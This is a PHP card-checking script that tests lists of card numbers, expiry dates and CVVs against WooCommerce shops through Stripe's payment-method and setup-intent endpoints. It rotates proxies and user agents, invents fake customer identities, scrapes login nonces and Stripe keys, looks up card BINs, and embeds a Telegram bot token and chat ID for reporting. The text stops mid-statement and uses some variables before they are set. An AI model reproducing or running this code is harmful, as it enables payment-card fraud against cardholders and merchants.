<?php


error_reporting(E_ERROR|E_PARSE);
ini_set("max_execution_time", "0");
function getCurrentDateTime($timezone = 'America/Los_Angeles') {
    // Set the default timezone
    date_default_timezone_set($timezone);

    // Create a DateTime object for the current time
    $datetime = new DateTime();

    // Format the DateTime object into a string
    $dateTimeString = $datetime->format('Y-m-d+H:i:s');

    // Encode the time part to handle special characters
    $encodedDateTime = str_replace(':', '%3A', $dateTimeString);

    // Return the formatted time string
    return 'time=' . $encodedDateTime;
}



// Telegram Bot API token and chat ID
$telegramToken = "8107078866:AAEMyhBGQiCJ92CKet4bfdI1G7c_ZLBt7Gs"; // Replace with your bot token
$chatId = "-1002902179897"; // Replace with your chat ID

// Function to send message to Telegram
function sendToTelegram($message, $telegramToken, $chatId) {
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url); // Send the message
}


$usaTimezone = new DateTimeZone("America/New_York"); 

$pys_browser_time = "22-23|Friday|March";

list($time_range, $day, $month) = explode("|", $pys_browser_time);
list($start_hour, $end_hour) = explode("-", $time_range);

$currentYear = date("Y");

$startTimeUTC = new DateTime("$currentYear $month $day $start_hour:00:00", new DateTimeZone("UTC"));
$endTimeUTC = new DateTime("$currentYear $month $day $end_hour:00:00", new DateTimeZone("UTC"));

$startTimeUSA = clone $startTimeUTC;
$startTimeUSA->setTimezone($usaTimezone);

$endTimeUSA = clone $endTimeUTC;
$endTimeUSA->setTimezone($usaTimezone);

$converted_time = $startTimeUSA->format("H") . "-" . $endTimeUSA->format("H");
$converted_day = $startTimeUSA->format("l");  
$converted_month = $startTimeUSA->format("F"); 

$final_output = urlencode("$converted_time|$converted_day|$converted_month");





  # -------------- [ START PROXY ] -------------- #
$proxyuser = '';

if (isset($_POST['proxy']) || isset($_GET['proxy'])) {
    $proxyuser = $_POST['proxy'] ?? $_GET['proxy'];
}

$proxy_port = '';
$user_pass = '';

if (!empty($proxyuser)) {
    $proxy_parts = explode(':', $proxyuser);
    
    if (count($proxy_parts) >= 2) {
        $proxy_port = $proxy_parts[0] . ':' . $proxy_parts[1];
    }

    if (count($proxy_parts) == 4) {
        $user_pass = $proxy_parts[2] . ':' . $proxy_parts[3];
    }
}

function setupCurlProxy($ch, $proxy_port, $user_pass) {
    if (!empty($proxy_port)) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    }
    if (!empty($user_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
    }
}

function fetchCurrentIp($proxy_port = '', $user_pass = '') {
    $ch = curl_init();
    $urlToGet = 'https://chrngcl-public.is-a-good.dev/api/v1/ip';
    curl_setopt($ch, CURLOPT_URL, $urlToGet);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    // Set up proxy if provided
    if (!empty($proxy_port)) {
        setupCurlProxy($ch, $proxy_port, $user_pass);
    }

    // Execute cURL and get response
    $ipdata = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Handle cURL errors
    if ($ipdata === false) {
        $error = curl_error($ch);
         "cURL Error: $error\n";
        curl_close($ch);
        return false;
    }

    curl_close($ch);

    // Handle HTTP errors
    if ($http_code !== 200) {
        echo "HTTP Error: $http_code\n";
        return false;
    }

    // Decode JSON response and check if 'ip' field exists
    $responseData = json_decode($ipdata, true);
    if (isset($responseData['ip'])) {
        $query = $responseData['ip']; // Get the IP address

        // Mask the last two parts of the IP address
        $ipParts = explode('.', $query);
        $ipParts[2] = 'xxx';
        $ipParts[3] = 'xx';

        // Return the masked IP address
        return implode('.', $ipParts);
    } else {
         "IP address not found in the response.\n";
        return false;
    }
}

// Example usage:
$ip = fetchCurrentIp($proxy_port, $user_pass);
if ($ip !== false) {
     "Masked IP: $ip\n";
}

ob_start();
$urls = explode(',', $_GET['sites']);

// Clean and reindex the array
$urls = array_values(array_map('trim', array_filter($urls)));

// Randomly select one URL
$lineNumbers = $urls[array_rand($urls)];

// Get the line number (1-based)
$lineNumber = array_search($lineNumbers, $urls) + 1;

// Parse URLs
$parsed_url = parse_url(trim($lineNumbers));
$product_page_url = $lineNumbers;
$url2 = parse_url($product_page_url);
$hostname = $url2['host'];


if (strpos($hostname, 'http://') === false && strpos($hostname, 'https://') === false) {
    $hostname1 = 'http://' . $hostname;
}

# PHP
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}



# FUNCTION
function choc($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


# CARD

$lista = str_replace(" ", "", $lista);
$i     = explode("|", $lista);
$cc    = preg_replace("/[^0-9]/", "", $i[0]);
$mm    = preg_replace("/[^0-9]/", "", $i[1]);
$yyyy  = preg_replace("/[^0-9]/", "", $i[2]);
$yy    = substr($yyyy, 2, 4);
$cvv   = preg_replace("/[^0-9]/", "", $i[3]);
$bin   = substr($cc, 0, 6);
$last4 = substr($cc, 12, 16);
$m     = ltrim($mm, "0");
$last4 = substr($cc, -4);
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);

if(strlen($yyyy) == 4){
    $yyyy = substr($yyyy, 2);
};


$FirstDigit = substr($cc, 0,1);
if($FirstDigit == '5'){
    $FirstDigit = 'MasterCard';
}
elseif($FirstDigit == '4'){
    $FirstDigit = 'Visa';
}
elseif($FirstDigit == '6'){
    $FirstDigit = 'Discover';
}
else {
    $FirstDigit = 'AMEX';
}


function generateUUIDv4() {
    $data = random_bytes(16);

    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);

    $hex = bin2hex($data);

    return sprintf('%s-%s-%s-%s-%s',
        substr($hex, 0, 8),
        substr($hex, 8, 4),
        substr($hex, 12, 4),
        substr($hex, 16, 4),
        substr($hex, 20, 12)
    );
}

generateUUIDv4();
$sid = generateUUIDv4();
$sessionid = generateUUIDv4();
$muid = generateUUIDv4();
$guid = generateUUIDv4();


function generateRandomString($length = 10) {

    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';

    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$ses5 = generateRandomString(24);
$ses6 = generateRandomString(26);

$una = 'abcdefghijklnmopqrstuvwxyz1234567890';
$una1 = substr(str_shuffle($una), 0, 8);
$dalawa = '1234567890';
$dalawa2 = substr(str_shuffle($dalawa), 0, 4);
$tatlo = 'abcdefghijklnmopqrstuvwxyz123456789';
$tatlo3 = substr(str_shuffle($tatlo), 0, 4);
$apat = '1234567890';
$apat4 = substr(str_shuffle($apat), 0, 4);
$lima = 'abcdefghijklnmopqrstuvwxyz123456789';
$lima5 = substr(str_shuffle($lima), 0, 12);
$device = generateRandomString(32);
$cor = generateRandomString(32);

$kav = ''.$una1.'-'.$dalawa2.'-'.$tatlo3.'-'.$apat4.'-'.$lima5.'';

$retry = 0;
retry:


#---------------- [ USER AGENT ] ------------------#

$user_agents = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36"
];

// Pagpili ng random na user agent
$ua = $user_agents[array_rand($user_agents)];
#---------------------------------------------[ Create User ]---------------------------------------------]

// Function to generate a random name
function generateRandomName() {
    $firstNames = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin',
'Isabella', 'Jacob', 'Lily', 'Daniel', 'Mia', 'Alexander', 'Charlotte', 'Samuel', 'Sophia', 'Matthew',
'Amelia', 'David', 'Chloe', 'Luke', 'Ella', 'Henry', 'Grace', 'Andrew', 'Natalie', 'Ethan',
'Harper', 'Jack', 'Scarlett', 'Ryan', 'Abigail', 'Noah', 'Leah', 'Joshua', 'Zoe', 'Caleb',
'Alice', 'Nathan', 'Hannah', 'Isaac', 'Victoria', 'Mason', 'Audrey', 'Elijah', 'Evelyn', 'Dylan',
'Madison', 'Aaron', 'Lucy', 'Thomas', 'Ruby', 'Christopher', 'Penelope', 'George', 'Sadie', 'Logan',
'Ellie', 'Anthony', 'Hazel', 'Samuel', 'Nora', 'Gabriel', 'Aurora', 'Jack', 'Caroline', 'Ryan',
'Stella', 'Owen', 'Riley', 'Julian', 'Sienna', 'Daniel', 'Clara', 'Matthew', 'Leah', 'Oliver',
'Lily', 'Max', 'Violet', 'Aiden', 'Lila', 'Sebastian', 'Daisy', 'Wyatt', 'Clara', 'Leo',
'Madison', 'Finn', 'Eva', 'Jackson', 'Isla', 'Arthur', 'Eliza', 'Charles', 'Amelia', 'Oscar',
'Sophia', 'Victor'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Roberts',
'Walker', 'Perez', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Green', 'Adams', 'Baker',
'Gonzalez', 'Nelson', 'Carter', 'Mitchell', 'Evans', 'Collins', 'Stewart', 'Sanchez', 'Morales', 'Murphy',
'Cook', 'Rogers', 'Morgan', 'Bell', 'Cooper', 'Reed', 'Bailey', 'Gomez', 'Lambert', 'Parker',
'Watson', 'Brooks', 'Kelly', 'Sanders', 'Price', 'Bennett', 'Wood', 'Barnes', 'Ross', 'Hughes',
'Ward', 'Flores', 'Russell', 'Diaz', 'Ramirez', 'Jenkins', 'Perry', 'Powell', 'Long', 'Foster',
'Grant', 'Harrison', 'Hawkins', 'Curtis', 'Chavez', 'George', 'Simmons', 'Webb', 'Bryant', 'Alexander',
'Johnston', 'Mendoza', 'Bowman', 'Ryan', 'Sullivan', 'Freeman', 'Graham', 'Kim', 'Cameron', 'Simpson',
'Holland', 'Vasquez', 'Patel', 'Morris', 'Robinson', 'Hicks', 'Kimberly', 'Richardson', 'Lynch', 'Chapman',
'Vega', 'Patterson', 'Craig', 'Nichols', 'Gibson', 'Hunter', 'Diaz', 'Harrison', 'Bishop', 'Shaw'];

    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];

    return [$firstName, $lastName];
}

// Function to generate a random email domain
function generateRandomEmailDomain() {
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'edu.ph', 'edu.pl',
'icloud.com', 'zoho.com', 'aol.com', 'protonmail.com', 'hotmail.com',
'mail.com', 'live.com', 'fastmail.com', 'gmx.com', 'mail.ru',
'ymail.com', 'inbox.com', 'tutanota.com', 'yandex.com', 'rocketmail.com',
'lavabit.com', 'comcast.net', 'btinternet.com', 'seznam.cz', 'orange.fr'];
    return $domains[array_rand($domains)];
}

// Generate random name
list($fname, $lname) = generateRandomName();
$emailDomain = generateRandomEmailDomain();
$email = strtolower($fname . '.' . $lname . '@' . $emailDomain);


$cookies = tempnam(sys_get_temp_dir(), 'cookie');
@unlink($cookies);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/details/' . $bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

// Optional headers (can be omitted if the site doesn't require them)
$headers = [
    'user-agent: '.$ua,
    'referer: https://bincheck.io/',
    'accept-language: en-US,en;q=0.9'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

///////////BIN//////////////////
preg_match('/<td[^>]*>\s*BIN\/IIN\s*<\/td>\s*<td[^>]*>\s*(.*?)\s*<\/td>/i', $response, $matches);

if (!empty($matches[1])) {
    $tite = trim($matches[1]);
}
///////////BRAND//////////////////
preg_match('/<td[^>]*>\s*Card\s*Brand\s*<\/td>\s*<td[^>]*>\s*(.*?)\s*<\/td>/i', $response, $matches);

if (!empty($matches[1])) {
    $cardBrand = trim($matches[1]);
}
//////////////////CARDTYPE///////
preg_match('/<td[^>]*>\s*Card\s*Type\s*<\/td>\s*<td[^>]*>\s*(.*?)\s*<\/td>/i', $response, $matches);
if (!empty($matches[1])) {
    $cardtype = trim($matches[1]);
}

////////////////CARD LEVEL////////
preg_match('/<td[^>]*>\s*Card\s*Level\s*<\/td>\s*<td[^>]*>\s*(.*?)\s*<\/td>/i', $response, $matches);
if (!empty($matches[1])) {
    $cardlevel = trim($matches[1]);
}

//////ISSUER/////////////
preg_match('/<td[^>]*>\s*Issuer\s*Name\s*\/\s*Bank\s*<\/td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"/i', $response, $matchIssuer);
$issuerName = !empty($matchIssuer[1]) ? trim($matchIssuer[1]) : 'Not found';

// Clean up Issuer name by removing "Complete" and everything after "database" (case-insensitive)
if ($issuerName !== 'Not found') {
    // Remove leading "Complete" (with optional space)
    $issuerName = preg_replace('/^Complete\s*/i', '', $issuerName);

    // Remove "database" and everything after it
    $issuerName = preg_replace('/\s*database.*$/i', '', $issuerName);

    
    // Remove trailing country, e.g. " - AUSTRIA"
    $issuerName = preg_replace('/\s*-\s*[A-Z\s]+$/i', '', $issuerName);

    $issuerName = trim($issuerName);
}

//////COUNTRYYYYYYYYYYY////////////////
preg_match('/<td[^>]*>\s*ISO\s*Country\s*Name\s*<\/td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"/i', $response, $matchCountry);
$isoCountry = !empty($matchCountry[1]) ? trim($matchCountry[1]) : 'Not found';
if ($isoCountry !== 'Not found') {
    $isoCountry = preg_replace('/^Complete\s*/i', '', $isoCountry);
    $isoCountry = preg_replace('/\s*database.*$/i', '', $isoCountry);
    $isoCountry = trim($isoCountry);
}
#--------------------------------------------------[ ATC ]--------------------------------------------------#

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$hostname/my-account/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "authority: $hostname",
        "User-Agent: $ua",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "referer: https://$hostname/"
    ],
]);
$wawa = curl_exec($ch);
$register_nonce = choc($wewe, '<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="','"');

#--------------------------------------------------[ CHECKOUT ]--------------------------------------------------#

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$hostname/my-account/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "authority: $hostname",
        "User-Agent: $ua",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "origin: https://$hostname",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://$hostname/my-account/"
    ],
    CURLOPT_POSTFIELDS => 'username='.$fname.'&password='.$lname.'&login=Log+in&woocommerce-login-nonce='.$register_nonce.'&_wp_http_referer=%2Fmy-account%2F',
]);
$wewe = curl_exec($ch);




$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$hostname/my-account/add-payment-method/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "authority: $hostname",
        "User-Agent: $ua",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "referer: https://$hostname/my-account/payment-methods/"
    ],
]);
$wiwi = curl_exec($ch);
$intent_nonce = choc($wiwi, '"createAndConfirmSetupIntentNonce":"','"');
$pk = choc($wiwi, '"key":"','"');

#--------------------------------------------------[ WC-AJAX ]--------------------------------------------------#

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.stripe.com/v1/payment_methods",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "authority: api.stripe.com",
        "User-Agent: $ua",
        "Accept: application/json",
        "content-type: application/x-www-form-urlencoded",
        "origin: https://js.stripe.com",
        "referer: https://js.stripe.com/"
    ],
    CURLOPT_POSTFIELDS => 'type=card&card[number]='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&card[cvc]='.$cvv.'&card[exp_year]='.$yyyy.'&card[exp_month]='.$mm.'&allow_redisplay=unspecified&billing_details[address][country]=PH&pasted_fields=number&payment_user_agent=stripe.js%2F0c7ffc14a8%3B+stripe-js-v3%2F0c7ffc14a8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F$hostname&time_on_page=74326&client_attribution_metadata[client_session_id]='.$sessionid.'&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&_stripe_version=2024-06-20',
]);
$wowo = curl_exec($ch);
$token = choc($wowo, '"id": "','"');


$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$hostname/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "authority: $hostname",
        "User-Agent: $ua",
        "Accept: */*",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://$hostname",
        "referer: https://$hostname/my-account/add-payment-method/"
    ],
    CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$token.'&wc-stripe-payment-type=card&_ajax_nonce='.$intent_nonce.'',
]);
$wuwu = curl_exec($ch);
$ro2 = json_decode($wuwu, true);;
$result = choc($wuwu, '"success":',',');
$msg = choc($wuwu, '"message":"','"');
$url = $ro2['redirect'];
$od = $ro2['order_id'];
$endTime = microtime(true);
$overallTime = $endTime - $startTime;
$status = choc($wuwu, '"status": "','",');


if ( $result == 'true' ) {
